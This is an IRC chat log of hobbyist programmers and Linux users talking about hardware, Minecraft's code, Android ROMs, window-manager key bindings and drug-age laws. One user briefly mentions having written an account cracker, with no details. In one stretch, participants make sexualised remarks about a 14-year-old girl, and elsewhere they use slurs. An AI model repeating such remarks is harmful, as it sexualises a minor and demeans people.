20:04         BigE │  that 4s boot and instantly loaded data and programs
20:04        tbuck │  so it wouldnt be as much of a difference as if i was upgrading from a HDD
20:04     Ampharos │  eww, hybrids, them seems like a bad idea compared to just ssd+hdd
20:04      bottomy │  anyone ever bothered learning LLVMs IR language before? I've looked into it, but now thinking I should actually learn it.
20:04        tbuck │  yeah thats why i got a pure SSD
20:05         quit │  Galtath
20:05      bottomy │  plus if you don't have much RAM then SSD will likely make a big difference in overall performance too
20:05     Ampharos │  interesting but isnt it supposed to be an intermediate
20:06     Ampharos │  like IL/JVM bytecode?
20:06      bottomy │  yeh it is
20:06      bottomy │  but it seems like a good alternative to writing 3 versions of asm for 3 different architectures lol
20:06     Ampharos │  ahah
20:06     Ampharos │  universal machine code/asm
20:06     Ampharos │  seems awesome
20:07      bottomy │  just it's not pretty, e.g.   %11 = shufflevector <4 x float> <float undef, float undef, float 0.000000e+00, float 0.000000e+00>, <4 x float> %9, <4 x i32> <i32 4, i32 5, i32 2, i32 3>
20:07      bottomy │  ;-;
20:07     Ampharos │  yeah just write C
20:08         quit │  Ampharos
20:10      bottomy │  yeh like that's what I mostly do just some functions it can't optimize too well so I write them in asm. but the asm generated from the C bothers me a lot at times (generates redundant instructions, doesn't parallelize/makes too many dependancy chains :s
20:10      bottomy │  oh gone lol
20:11        dami0 │  drop the c bomb and take a runner
20:11        dami0 │  also, asm?
20:12      bottomy │  assembly
20:12        dami0 │  oh. 
20:12   emptytapes │  assembly... *shudders*
20:13        dami0 │  seems hard
20:13      akacase │  What are you writing that requires so much optimization?
20:14      bottomy │  I do a lot of games and graphics work, always looking to improve performance
20:14      akacase │  k.
20:15        dami0 │  oh. ok then
20:15        dami0 │  that explains that
20:18         BigE │  bottomy: i hope you know, you are the only game developer who does that
20:18      bottomy │  lol
20:18         BigE │  judging by the optimization current games have
20:18      bottomy │  I'm not though
20:18        tbuck │  oh my god dwarffortress needs some optimization....
20:18      bottomy │  lol
20:20         BigE │  optimization? or multicore support
20:20        tbuck │  probably both
20:20         BigE │  lul
20:20        tbuck │  multicore would be so nice
20:23        dami0 │  dwarffortress. I wonder if it will ever get gpgpu

20:25     yrmt|away│  yrmt-
20:25      bottomy │  oh I thought you were joking, I don't know too much about df, but I don't think it has much that would be ideal for the GPU
20:26        dami0 │  really?
20:26        dami0 │  I thought distance calculations and st
20:26        dami0 │  stuff* like that could work on it
20:27        dami0 │  even a little would still help. it's a beast
20:27        dami0 │  anyways, dinner, bbl.
20:28      bottomy │  well stuff that works well as GPGPU is stuff that doesn't interact with other things (can be easily parallelized), and can be kept more or less on the GPU (not sending data back and forth from the CPU<->GPU or at least keeping that to a minimum)
20:31      jjumbii │  dami0: bottomy is a GPU programming genius
20:31      jjumbii │  he's also 12

20:32        tbuck │  yeah DF doesnt rely on the GPU much at all, mostly CPU instensice
20:32        tbuck │  wow i hacked that word up
20:32        tbuck │  intensive*
20:33        tbuck │  but its bad.. in adventure mode it lags just walking around
20:33         BigE │  uiu
20:33         BigE │  oops
20:33         BigE │  well
20:33         BigE │  how about you optimize it, and submit it as a patch
20:33        tbuck │  LOL
20:33      jjumbii │  just play minecraft
20:33        tbuck │  ok brb optimizing Df
20:34      jjumbii │  it's coded way better obviously
20:34        tbuck │  yeah thats just as bad...
20:34      jjumbii │  i feel like mojang has enough money
20:34      jjumbii │  port it to C, release open source
20:34      jjumbii │  just accept donations
20:34        tbuck │  i cant play minecraft anymore it makes me sad. all the bugs have made it unplayable for me
20:34        tbuck │  i was trying to breed horses for a while
20:35        tbuck │  but theres a bug where all the animals group together into like a northwest corner or something
20:35         join │  NeoTerra
20:35         mode │  +o NeoTerra
20:35        tbuck │  so i have this huge field.. alll sorts of horses bunched together in one lil spot glitching out of the fence
20:35        tbuck │  just little shit like that.. got over it eventually
20:35      bottomy │  didn't you know MC actually simulates the entire reproduction process (down at the cell level).
20:36        tbuck │  lol right
20:36        tbuck │  i just cant look past the bugs anymore tho. and they make so much money off of it. 
20:36        tbuck │  at this point they are just adding more shit, which adds more bugs. none of the bugs ever get fixed
20:37      jjumbii │  bottomy: for real?
20:37      jjumbii │  that can't be true lol
20:37        tbuck │  jjumbii: hell no
20:38      bottomy │  lol
20:38      jjumbii │  tbuck: i wanna play flatworld survival
20:38      jjumbii │  it's so fun
20:38      jjumbii │  you just rape and pillage villages
20:38        tbuck │  i like hardcore mode now, actually a bit of a challenge
20:38        tbuck │  not the deathban shit
20:38         quit │  sam
20:38        tbuck │  just no health regen
20:39        tbuck │  but yeah mojang has enough money at this point i dont see why they dont multithread that shit
20:40        tbuck │  or SOMETHING
20:40      jjumbii │  ^
20:40      jjumbii │  the dumbfucks should of started with C
20:40         berk │  minecraft is so buggy
20:40        tbuck │  i think they are afraid to hire real developers
20:40         berk │  tbuck: indie
20:40        tbuck │  they dont want to feel stupid
20:40      jjumbii │  i've seen notch code, he's a fucking wizard
20:40      jjumbii │  but, java
20:40      jjumbii │  damn
20:41         BigE │  i just burned my mouth because i couldnt imagine this plastic cup would keep a liquid hot for so long
20:41         BigE │  jjumbii: are you kidding? 
20:41      jjumbii │  nope
20:41         BigE │  notch is notorious for being a terrible coder even by java standards
20:41      jjumbii │  maybe that's why he does everything so fast...
20:42      bottomy │  they probably developed the game in a very dependent way so everything is dependent on each other so it's hard to go in and redo things. at least that's the only reason I can think of why they wouldn't want to go fix old bugs and optimize.
20:42         BigE │  he could also learn a thing or two about multicore or at least opencl
20:42      jjumbii │  i've watched livestreams of him coding like back in 1.3 and his fingers are just like "kjsdfnjkshdbkfjhb askjhdfb askhdfb kjasdhbf jshfbjahsbdfj hasbdf"
20:42         berk │  minecraft is badly structured
20:42      jjumbii │  bottomy: yeah
20:42        tbuck │  bottomy: thats what ive always thought. but still at some point you got to stop adding things because its just getting worse
20:42      jjumbii │  ^
20:43      jjumbii │  fix all the bugs, then add things
20:43        tbuck │  like he added in some chat shit so you could click someones name and msg them
20:43      bottomy │  yeh they really should just call it a day then
20:43         BigE │  minecraft is a train wreck in the coding department, i have a buddy who is a pretty avid modder for the game and he hates doing it sometimes
20:43      jjumbii │  that fucking world lighting glitch is still there
20:43        tbuck │  broke opening URLs
20:43        tbuck │  commented on reddit bitching and he replied with some shit "its not as easy as it seems"
20:43      jjumbii │  also, the PEOPLE
20:43        tbuck │  URLs are still broken...
20:43      jjumbii │  80% of players are 12
20:43         BigE │  there are too many things in minecraft, it has shitty optimization, bad coding structure
20:43      jjumbii │  but the idea, it's so fun
20:43        tbuck │  he fixed (broke) what wasnt broke in the first place
20:44       Ypnose │  80% of players are 12
20:44       Ypnose │  80% of players are 12
20:44       Ypnose │  so true
20:44      jjumbii │  or less
20:44         BigE │  lul
20:44         berk │  umm
20:44      jjumbii │  i've had 8 year olds join my server
20:44      jjumbii │  not even kidding
20:44         BigE │  my 6 year old cousin plays it online
20:44         berk │  does anybody here know anything about 0x10c?
20:44         BigE │  actually
20:44      jjumbii │  jesus
20:44      jjumbii │  berk: yeah, shame
20:44      jjumbii │  looked so fun
20:44         BigE │  i dont even know if he is 6
20:44      bottomy │  I think they project died?
20:44      jjumbii │  ^
20:44      bottomy │  that*
20:44      jjumbii │  they should of kept it going

20:45         berk │  really the sort of thing that would attract people like us
20:45      jjumbii │  i know a sam
20:45      jjumbii │  he really should of gone through with it
20:45      bottomy │  not sure how well it would've worked for the average player though
20:45      jjumbii │  what does Notch do now anyways
20:45      jjumbii │  bottomy: 12 year olds would be clueless
20:45     NeoTerra │  BigE thought you could sneak in there huh
20:46         BigE │  awwwww

20:46         berk │  I think Terraria is better than Minecraft anyways
20:47      jjumbii │  ^
20:47      jjumbii │  except, C#
20:47         berk │  except the building part, though
20:47      jjumbii │  XNA shit
20:47         berk │  yeah
20:47         berk │  jjumbii: did you know that the C# code isn't obfuscated?
20:47      jjumbii │  nope, but not surprising
20:47       Ypnose │  I also didn't play Minecraft very much, because it uses Java
20:47         berk │  i used some shitty .NET tool to revert it back to *.cs file

20:48         berk │  the thing with Minecraft, was that it was viral
20:48         berk │  there's even lego toys of it
20:48        tbuck │  yeah thats why i think the developers focus is all fucked
20:48        tbuck │  they trying to make all the chilluns happys
20:48         BigE │  isnt someone re-writing minecraft in c++?
20:48      jjumbii │  yeah, but it probably sucks
20:49         berk │  BigE: every 10% of programmers are rewriting minecraft
20:49         berk │  there's tons of minecraft-like games around :D

20:52        tbuck │  yeah i dont even.. but hey its got multicore support on linux
20:52      jjumbii │  its probably CLI
20:52        dami0 │  the game or php?
20:52      jjumbii │  so you can make multiplayer bots and shit
20:53        tbuck │  yeah it says client for server actually
20:53         berk │  Guys, how do you transfer music to your Android phone?
20:53      jjumbii │  me and shix wrote an account cracker in C

20:54         berk │  dami0: same
20:54         BigE │  berk: using adb
20:54      jjumbii │  cracked one account...
20:54         berk │  over WiFi I get 5Mb/s
20:54         BigE │  or sftp
20:54         BigE │  then use adb with a usb cable
20:54         berk │  BigE: isn't that slow?
20:55         BigE │  ive never had an issue
20:55         BigE │  then again, i do most things over sftp
20:55        dami0 │  just get CM
20:55        dami0 │  they have a terminal emulator
20:56        dami0 │  with all the standard utils like vim, nano, ssh, sftp.
20:56         berk │  I have CM 10.2
20:56         berk │  Really satisfied
20:56        dami0 │  that's like, 90% of what you'd normally use your phone for anyway
20:56         berk │  yep :p
20:57        dami0 │  it usually has pretty frontends, but that's another thing
20:57         berk │  on my phone I have a music player, a browser, a game, and a terminal emulator
20:57         BigE │  i am really skeptical of CM now
20:58        dami0 │  yeah, so many settings gone in 11
20:58        dami0 │  it's mega gay
20:58         BigE │  it seems that a lot of the devs are moving to omni-droid now that CM has gone for-profit
20:58      bottomy │  jjumbii: whenever I get around to setting up a blog I'll probably put some stuff up of the old one. since the old one I doubt I'll finish it/continue it cause I seriously fucked up the physics in it (should've made it a 3D physics system, but instead I made a 2D one and hacked on 3D, so things end up kind of buggy ;s).
20:58        dami0 │  BigE: It has?
20:58      bottomy │  or I might just make it a very short game instead. anyway new game I'm messing about with is a physics based puzzle platformer (sort of like gish but different puzzles/mechanics).
20:58        dami0 │  no wonder it's gotten so shit
21:00        dami0 │  Between 2006 and 2011, four veterinary clinics fell victim to a toxic dog that came in, puked, and knocked everybody in the clinic on their ass

21:02         BigE │  dami0: yes,CM got bought by google
21:03         BigE │  and then the lead devs relicensed all the code to be able to make money off of it via things like a CM phone
21:03         BigE │  so now
21:03        dami0 │  that's like, the stupidest thing I've ever hearsd
21:03        dami0 │  heard*
21:04         BigE │  100% true as well

22:22        dami0 │  on a flat road yeah.
22:23        dami0 │  maybe down the hill.
22:23         BigE │  on a hill you can still turn it around by going backwards and swinging hard though
22:23        dami0 │  wut?
22:24        dami0 │  just put it in neutral and roll it backwards
22:24        dami0 │  down the hill.

23:41         yrmt │  bottomy: optional but they require it?

23:42      jjumbii │  for some odd reason
23:42      bottomy │  I mean I just did a search for it to try find it's definition (too many results so I didn't) but I saw some of their usage examples and they use different types for the final arg.
23:43      bottomy │  so the function definition makes the 3rd argument optional. but internally the function requires it, reason they wrap it in a macro that requires a 3rd argument

23:45         dcat │  ah
23:46      bottomy │  e.g. you could do this curl_easy_setopt(url, option), but the function must expect that the varadic list have at least one value. so wrap it in a macro requiring a 3rd argument so now you're required to do curl_easy_setopt(url, option, something)

23:46         dcat │  yeah lel

00:24         BigE │  oh lol
00:25         BigE │  my debian raspi server has hit like over 100 days before

00:50      Galtath │  just curious if it's good or not
00:51        tbuck │  yrmt said to rebuild curl.. but thats not a very nice solution. "heres a tiny program. dependencies: rebuild curl yourself"

00:55      Galtath │  yea
00:55      Galtath │  that's what I figured
00:56         BigE │ shrugs
00:56         BigE │  the two appelbaum talks were pretty good
00:56  thang1thang │  whee
00:56      Galtath │  yeah
00:56  thang1thang │  finally got super + alt + hjkl to resize windows proper in bspwm
00:56      Galtath │  I'm watching the protect and infect talk now
00:56         BigE │  although he is doing that thing where he just randomly tells people to go fuck themselves
00:56         BigE │  which is really unprofessional
00:56         BigE │  IMO
00:57        dami0 │  omg omg om
00:57        dami0 │  it works ^^
00:57        tbuck │  oh yeah?

01:05         dcat │  hmm
01:05        dami0 │  I could try fixing that up like I said I would 
01:05        dami0 │  and stuff
01:05         dcat │  yeah
01:06        dami0 │  uh oh, somehow, I think my plans for an early night got swapped for late night code sesh
01:06         dcat │  I've probably messed up when using my ternary operators or something
01:06        tbuck │  haha
01:06        dami0 │  I don't even know what those are
01:06  thang1thang │  "hot glue accidents"
01:06        dami0 │  the less stuff you use, the less you can break :P
01:06         dcat │  yeah
01:07         dcat │  anyone have any great ideas for "new" ioup?
01:07  thang1thang │  ioup?
01:07         dcat │  any way to simplify it?
01:07         dcat │  I'll just remove all the shit I don't need
01:07  thang1thang │  well if I understand it right, ioup takes a screenshot and then uploads it to a website and then gives you the url in your pastebin?
01:07         BigE │  dont do it in C?
01:07         dcat │  fuck names and everything
01:07         dcat │  BigE: wut
01:08  thang1thang │  oh no it just uploads a file nvm
01:08  thang1thang │  got it mixed up in my head with a different one. I'm tired
01:09  thang1thang │  dcat
01:09  thang1thang │  you still have that hacky mouse disable script?
01:12         quit │  marcusant
01:13  thang1thang │  alternatively, does anyone know if there's a way to take a simple boolean (0/1) terminal command and make it toggle if you execute it more than once?

01:16           eye│  eye`off
01:16        dami0 │  pick a simpler language
01:16  thang1thang │  yeah, like lisp or perl
01:16  thang1thang │  or haskell
01:17        dami0 │  or python
01:17  thang1thang │  nah too complicated
01:18  thang1thang │  gotta get dat white space right, bro
01:18  thang1thang │  you know how hard it is to make me hit the return key the right amount of times?
01:19        dami0 │  ?
01:20        dami0 │  return? newlines don't matter, it's all about the tabs
01:20  thang1thang │  oh
01:20  thang1thang │  I knew it was one of those
01:20  thang1thang │  I figured it'd be newline since who the fuck cares about tabs
01:20        dami0 │  just use the right structure
01:21        dami0 │  yeah, no one cares, but it helps a fuckton
01:21  thang1thang │  if you set your .vimrc to have the tab button = like 15 spaces
01:21  thang1thang │  it'll fuck up your entire python right?
01:21        dami0 │  oh no
01:21        dami0 │  it can be whatever size
01:21        dami0 │  it has to be consistent though
01:21  thang1thang │  ah okay
01:21  thang1thang │  that's not "too" bad I guess
01:21  thang1thang │  I'm just still kinda flabbergasted that a modern language would actually care about stuff like white space ._.
01:21        dami0 │  yeah, pretty much all you got to do is just keep it the same number of tab presses for whatever
01:21  thang1thang │  although Iguess it does mean you don't need all the parenthesis and {} or what not
01:22        dami0 │  well, it helped me write really readable code by instinct
01:22        dami0 │  huh
01:22  thang1thang │  wait, how? o.O
01:22        dami0 │  it gets to the point where you forget that you need a : to initiate loops and shit
01:23  thang1thang │  lol
01:23        dami0 │  well, I just wrote in it. no I'm really anal about getting all my code lined up neat and all that
01:23        dami0 │  now*
01:23  thang1thang │  I'm anal about it as well (for the most part. I need a vim plugin to be super anal about lining up things on certain characters across lines)
01:23  thang1thang │  not 'cause of python, just personality I guess
01:23  thang1thang │  I like my code to be so pretty it could run for american idol 
01:24        dami0 │ appreciates that sentiment
01:25  thang1thang │  ah fuck it
01:25  thang1thang │  finally!
01:26  thang1thang │  took forever to find the right mouse process number...
01:26        dami0 │  ?
01:26  thang1thang │  using xinput set-prop (number) "device enabled" 0 to disable the mouse on hotkey
01:26  thang1thang │  switching to 1 would enable obviously, hence my desire to have a toggle type of thing in sxhkd

01:35         BigE │  tbuck: that is why you just clone the drive in full just in case
01:36        tbuck │  i copied most everything from /home so i think im good besides a few stray configs or something
01:38        tbuck │  super happy with this laptop so far. cant go wrong with the price
01:39        tbuck │  battery life kinda sucks and it feels a little cheesy but hey, only 400 bucks
01:39  thang1thang │  what laptop'd you get?
01:39        tbuck │  acer s3
01:40         BigE │  i got a thinkpad for 400, totally worth it
01:40  thang1thang │  lol acer s3 was $900 new
01:40        tbuck │  i looked for some thinkpads
01:40  thang1thang │  thinkpads are the shit
01:40  thang1thang │  I think we're gonna get one for my little sister
01:40        tbuck │  yeah it was pretty expensice when it came out
01:40  thang1thang │  she'll be a bit disappointed 'cause she wants a mac, I think
01:41         BigE │  well
01:41         BigE │  tbh
01:41  thang1thang │  but it's better than nothing and a third of the price :p
01:41         BigE │  i would rather overpay for a mac than be stuck with windows on my machine
01:41  thang1thang │  lol
01:41  thang1thang │  "be stuck with" you have linux
01:41        dami0 │  can you not linux on it?
01:41         BigE │  im completely serious
01:42  thang1thang │  yeah I know
01:42        tbuck │  this thing plays well with mah nix
01:42        dami0 │  or bsd or something?
01:42  thang1thang │  I'd take a mac over windows anyway
01:42  thang1thang │  anyday*
01:42         BigE │  yeah, *we* can handle linux.
01:42        dami0 │  mac ain't bad
01:42         BigE │  Can she>?
01:42  thang1thang │  my sister?
01:42        dami0 │  well, put mint on it
01:42  thang1thang │  she would cry if she had linux 
01:42  thang1thang │  and rage quit
01:42         BigE │  then OSX is by far the better choice
01:42  thang1thang │  yeah
01:42        dami0 │  it'll still facebook
01:42         BigE │  by far
01:42  thang1thang │  she uses photoshop with a tablet
01:42         BigE │  lul
01:42        dami0 │  lel
01:43         BigE │  i would Mac it 
01:43  thang1thang │  wacom tablet*
01:43         BigE │  but that is me
01:43  thang1thang │  yeah I would mac it too. Nice second gen retina MBP, or even an older macbookpro like mine (late 2011)
01:43  thang1thang │  anything with an iCPU lol
01:43         BigE │  i would sell yuo my 2009 MBP
01:43  thang1thang │  just stick 8GB of ram on it, buy a SSD and drop it in and take out the CD drive and drop the 750G HDD in that slot
01:43         BigE │  it is still good except for the fried battery
01:43  thang1thang │  could be done for like $800
01:44  thang1thang │  and eh, my dad would be the one buying said laptop
01:44  thang1thang │  and he's an extremely practical person
01:44  thang1thang │  so "os x is a better OS for photoshop" isn't worth a $500+ price jump
01:44         BigE │  that is a pretty terrible argument
01:45  thang1thang │  well yeah that's not an argument I would actually use
01:45         mxtm │  OS X IS A BEST OS
01:45         mxtm │  APPLE MADE IT
01:45  thang1thang │  but that sorta thing
01:45         mxtm │  DUH
01:45         mxtm │  YOU PIECES OF SHIT
01:45         mxtm │  /s

01:45         BigE │  "Windows sucks because it is power hungry, unstable, user unfriendly, inflexible and generally broken" is much better
01:45         mxtm │  if I do... remember... I loved you, dami0 
01:45  thang1thang │  mxtm I fart in your general direction and your mother smells of elderberries
01:45        dami0 │  mxtm: /s :P
01:46         mxtm │  thang1thang2, I'd drag my DICK through a mile of broken glass
01:46         mxtm │  just to hear you FART through a WALKIE TALKIE
01:46        dami0 │  lel
01:46         BigE │  mxtm: this isnt reddit
01:46  thang1thang │  anyway, my dad's used nothing but windows since the late 80s
01:46  thang1thang │  he started with DOS and went all the way up
01:46         mxtm │  BigE, owait rly?
01:46  thang1thang │  he would say "bullshit" on the power hungry, u nstable, user unfriendly, inflexible and generally broken argument
01:46         BigE │  and he hasnt hung himself because......
01:47  thang1thang │  his laptop is legitimately older than my sister
01:47  thang1thang │  and it's still running XP on a pentium 4
01:47         mxtm │  thang1thang2, is she hot
01:47  thang1thang │  she's 14
01:47         BigE │  windows xp is best windows
01:47         mxtm │  thang1thang2, I'm 15
01:47         mxtm │ shrugs
01:47  thang1thang │  true...
01:47         mxtm │  but I don't want to do your sister
01:47  thang1thang │  lol sure you don't
01:47         mxtm │  nah seriously tho
01:47  thang1thang │  but anyway yeah she's pretty darn attractive
01:48  thang1thang │  I'd say her personality kinda takes a bit of the shine out, though...
01:48  thang1thang │  but that's 'cause I've known her all my life and I think she's a bit of a stuck up bitch
01:48        dami0 │  is she kind of like yrmt?
01:48  thang1thang │  I guess
01:48  thang1thang │  but with smaller boobs
01:48        dami0 │  boner killed
01:48        dami0 │  jk
01:49         BigE │  lul
01:49  thang1thang │  yrmt isn't THAT bad, tho
01:49  thang1thang │  she's just really damn self centered and can't really understand any other viewpoint than her own
01:49        dami0 │  yrmt isn't that bad, true
01:49        dami0 │  but a woman *like* yrmt
01:49  thang1thang │  and she justifies it 100% by saying "oh but Im' a teenage girl it's hormones and stuff, so it's okay"
01:49        dami0 │  with smaller boobs
01:49        dami0 │  ok, she's 14
01:49  thang1thang │  yeah, but she shouldn't act like that's an excuse to be a bitch
01:50        dami0 │  but still, just really brings it down yanow?
01:50  thang1thang │  being 14 is a great excuse for having moments of being self centered
01:50  thang1thang │  but it shouldn't be an excuse to act like a bitch, cause you can control that pretty well if you wanna put ANY effort into it
01:51        dami0 │  it's hard for some poeple though :<
01:51        dami0 │  I mean, i'm not usually a bitch
01:51        dami0 │  but it happens
01:52         mxtm │  thang1thang2, then maybe I would
01:52         mxtm │  tiene ella un culo grande?
01:52        dami0 │  i don't even
01:53  thang1thang │  ._.
01:53         mxtm │  thang1thang2, tengo que saber
01:53         mxtm │ empieza masturbarse
01:53        dami0 │  is that a dick joke?
01:53  thang1thang │  I translated that in my head as "does she want a huge dick?"
01:54        dami0 │  yeah, same
01:54  thang1thang │  "I'll give her my sword"
01:54         mxtm │  that means "does she have a big ass?"
01:54        dami0 │  just, seems like something a 15 yo would say
01:54         mxtm │  and "I have to know"
01:54        dami0 │  oh
01:54  thang1thang │  gawddamnit
01:54         mxtm │  and then "mxtm begins to masturbate"
01:54  thang1thang │  my spanish is so rusty
01:54        dami0 │  yeah
01:54  thang1thang │  I got that last part, thanks -_-
01:54        dami0 │  the last part was hard to get wrong
01:54  thang1thang │  but yeah, I learned spanish from people who spoke the queen's english
01:54  thang1thang │  and didn't swear or make dick jokes, so excuse me if I can't swear in spanish proper
01:54        dami0 │  oh, apparently I do that
01:55  thang1thang │  apparently do wut?

01:59        dami0 │  i've heard it before, from you I think
01:59        dami0 │  but I forgot what it is
01:59   Neuromatic │  Hospital
02:00        dami0 │  lel, would think it's like whorehouse or something
02:00        dami0 │  kranken
02:00        dami0 │  is that healing?
02:01  thang1thang │  lol
02:01   Neuromatic │  if I have to translate it word for wort its mean: A house where ill peaple go. krank==ill kranken==the ill people
02:01  thang1thang │  that's what I love about german
02:01  thang1thang │  you just string together a bunch of base words together and get compound words
02:02   Neuromatic │  only that uppercase and lowercase stuff is annoying
02:03  thang1thang │  ?
02:03        dami0 │  nouns are capitalised
02:03        dami0 │  in polish pronouns are non-capitalised always
02:03  thang1thang │  proper nouns are capatalized in english as well
02:03  thang1thang │  but nobody cares anymore
02:03        dami0 │  not proper
02:03        dami0 │  all nouns
02:03  thang1thang │  yeh I know what you meant
02:03  thang1thang │  I appended "as well" by mistake
02:04        dami0 │  but for example, in Polish, it's Polish nation, but polish language
02:04        dami0 │  maybe not a good example
02:05        dami0 │  but still
02:05        dami0 │  languages are silly.
02:05  thang1thang │  yeah lol
02:05  thang1thang │  kinda interesting how they all developed how they did, however

02:19  thang1thang │  gah, navigating youtube with pentadactyl is a nightmare
02:19        dami0 │  is that a vimlike browser?
02:20  thang1thang │  it's a bitching plugin for firefox, actually
02:20  thang1thang │  it's like vimperor but on steroids and 10x more powerful
02:20        dami0 │  oh
02:20        dami0 │  I've heard about it
02:20        dami0 │  it gets slagged off by the vimperator devs and all
02:20  thang1thang │  lol whut?
02:22        dami0 │  "ooooh, we were focused on functionality"
02:22        dami0 │  wait lemme see if I can find it

02:23  thang1thang │  fucking yesssssssssss
02:24        dami0 │  ?
02:24  thang1thang │  F3 on my cmoputer is bound to XF86LaunchA on the keyboard
02:24        dami0 │  ok
02:25  thang1thang │  so I went into sxhkd
02:25  thang1thang │  and finally figured out how to bind it to toggle
02:25         quit │  earsplit
02:25        dami0 │  can't find it
02:25  thang1thang │  so I bound it to: xinput set-prop 11 "Device Enabled" {0-1}
02:25  thang1thang │  so now itll toggle mouse on/off when I press it <3
02:26  thang1thang │  fucking ace right?

02:39        dami0 │  ?*
02:39  thang1thang │  no, just disable it
02:39  thang1thang │  I want that fucker dead and gone while I'm typing
02:39        dami0 │  oh
02:40        dami0 │  I'd like it hidden
02:40  thang1thang │  no more accidentally deleting lines in vim  or wreckin tabs in firefox
02:40  thang1thang │  and yeh I'm working on that
02:40        dami0 │  that doesn't happen to me though
02:40        dami0 │  just switch the mouse off
02:40  thang1thang │  I did switch the mouse off
02:42  thang1thang │  "xinput set-prop 11 "Device Enabled" 0
02:42  thang1thang │  turns the trackpad off
02:42  thang1thang │  I can't disable anything else or the keyboard breaks >_>
02:42        dami0 │  i do it through the hardware
02:43  thang1thang │  meh
02:43  thang1thang │  doing it through hardware means I can't toggle it on or off
02:44  thang1thang │  and I still need the mouse for some things because pentadactyl can't select text in 'visual' mode if the mouse is set to 0 for some reason...

02:59        tbuck │  hmm... seems like that "hybrid sdd" was actually built into my laptop somewhere?
02:59        tbuck │  ssd*
03:00        tbuck │  replaced the drive and that little 20gb SSD portion is still being detected
03:00         BigE │  huh
03:00        tbuck │  right
03:00         BigE │  so the flash must be soldered to the mobo
03:00        tbuck │  yeah something like that
03:01         vosh │  nice
03:01         vosh │  or did you want to get rid of it completely?
03:01         BigE │  that is real handy
03:01         BigE │  as long as your applications dont exceed 20GB
03:01        tbuck │  yeah im not sure how i want to partition this now... 
03:02         BigE │  either that, or you put all your custom configs on the mini ssd,  link them to the main SSD. That way you never have to worry about losing them
03:02        dami0 │  unless the ssd fails
03:03        dami0 │  but it's small enough to be dd'd somewhere

03:03        tbuck │  later
03:06         vosh │  anyone got an idea why freebsd idles at 1-2% CPU usage but ~70°C coretemp whereas debian idles at ~10% CPU usage but only 63°C in the same laptop on the same ssd model?
03:07         vosh │  both OS running the same setups.. same WM, same terminal emulator, etc.
03:09         BigE │  vosh: you running htop?
03:10         vosh │  yes
03:10         BigE │  could be a number of cores utilized problem?
03:10         BigE │  could also be downclocking
03:10         vosh │  don't think so
03:10         BigE │  could also be debian has better fan control
03:10         BigE │  do the fans run a bit quieter on freebsd?
03:10         vosh │  don't know about freebsd but at debian cpu is set to performance
03:11         vosh │  no, the fan is constantly running
03:11         vosh │  I got the higher temps at freebsd
03:11         BigE │  could it just be a difference in reported temps?
03:11         BigE │  i mean, laptop thermostats are not the most accurate things in the world
03:11         vosh │  not sure.. I mean the fan doesn't switch on for no reason
03:11         BigE │  hmmm
03:12         BigE │  are yuo using the same temperature monitor on both?
03:12         vosh │  at freebsd the fan is constantly running
03:12         vosh │  yes
03:12         BigE │  HMMMMMMM
03:12         vosh │  really makes me wonder.. only negative aspect about freebsd
03:14         vosh │  I have to renew the thermal paste of that laptop anyway, but it somehow strange temperatures at freeBSD are always about 5°C higher than at debian
03:15         BigE │  could it be something to do with freebsd lagging behind in instruction set optimization or something>
03:15         BigE │  ?
03:16         vosh │  I really don't know
03:16         vosh │  I mean in htop and top the cpu is usually between 1-15% but doesn't go significantly higher
03:16         vosh │  at debian the xsession already takes 3-5%

04:53       fenriz │  yeah, they have a weird WPA2-EAP thing going on, where by i need a cert
04:54       fenriz │  which i have....
04:54       fenriz │  and groups that deal with TKIP, and all that fancy jazz.
04:54       fenriz │  i tried everything including wpa_supplicant.
04:54       fenriz │  in the end i just got rid of netctl and used wicd.
04:55        tbuck │  damn i guess i got lucky with mine, connect and open a browser. put in your student email/password
04:55       fenriz │  daaamn.
04:55       fenriz │  you guys have that system?
04:56       fenriz │  we do too, but it is for the unsecured wifi lol
04:56         BigE │  fenriz WPA2-PEAP
04:56       fenriz │  i wish they had that for the secure.
04:56       fenriz │  BigE: yeah that one.
04:56         BigE │  we have it as well
04:56       fenriz │  BigE: such a bitch.  i spent 3 hours on campus trying to get it working.
04:56       fenriz │  BigE: yeah but you are using debian right?
04:56         BigE │  yes
04:56         BigE │  cause i dont have the care to spend hours trying to get wifi to work
04:56       fenriz │  i wonder if netctl has a gui interface
04:57       fenriz │  netctl is much faster on autoconnect
04:57       fenriz │  from the time i see my desktop startup, it takes 2 seconds and i'm connected
04:57       fenriz │  wicd takes fucking 20
04:57       fenriz │  ridiculous.

05:06       fenriz │  or just that no one has shops open

05:06         vypr │  No.

07:27        tbuck │  its true tho i had a harder time getting booze in high school than weed
07:27        tbuck │  people dont see it as a way to make money
07:30     NeoTerra │  shix you don't want it to happen?
07:31         BigE │  he thinks that legalizing it will magically make it harder to get
07:31         shix │  It will.
07:31         BigE │  just like alcohol is "hard to get"
07:31         shix │  Yup.
07:32         BigE │  yeah, cause older siblings will just magically disappear
07:32        tbuck │  harder than weed. people werent so quick to pick up their phones when you wanted then to go to the store for you
07:32         BigE │  i seriously dont care about anything that shix wants cause 99% of the time it is backwards and self serving
07:33     NeoTerra │  meh I don't think kids in high school should be smoking weed anyways
07:33     NeoTerra │  it makes your lazy
07:33         BigE │  so please, all the legalization
07:33     NeoTerra │  and is bad for brain development
07:33         BigE │  exactly
07:34        tbuck │  treats everyone a lil different
07:35     NeoTerra │  I don't think kids under 18/19 should get it
07:36     NeoTerra │  booze should be 16 and over
07:36     NeoTerra │  they should make weed and tobacco 18
07:36        tbuck │  lol idk about booze being 16
07:36        tbuck │  id have gotten into some stupid shit if that were the case
07:36     NeoTerra │  it's 16 all over Europe and they have way lower alcoholism rates
07:37        tbuck │  idk kids will be kids regardless
07:37      akacase │  stupidity can't be cured.
07:37         shix │  I think in Germany you can drink at age 14
07:37         shix │  oh
07:38         shix │  you have to be with your parents
07:38         shix │  but then you can buy beer and wine at 16, and everything else at 18
07:39         BigE │  akacase: no, but authoritarian prohibition until 18 doesnt solve anything either
07:39         BigE │  or 21
07:39         BigE │  or whatever
07:40         BigE │  however, north america is more a culture of over indulgence as opposed to a culture of moderation
07:41         BigE │  so maybe there is that to consider as well
07:45      akacase │  BigE: I was hinting at a more Libertarian system. If they want it, let them have it.
07:45         quit │  jjumbii
07:45         BigE │  ah
07:45         BigE │  well
07:45         BigE │  idk
07:46         BigE │  they are already pretty dumb
07:46         BigE │  but yeah, i take your point
07:46         BigE │  lul
07:46      akacase │  that way, they can all see whose dick is bigger by taking the more "badass" drugs.
07:47        tbuck │  lol i dont thin thats why people do drugs
07:48         BigE │  in high school maybe tbuck 
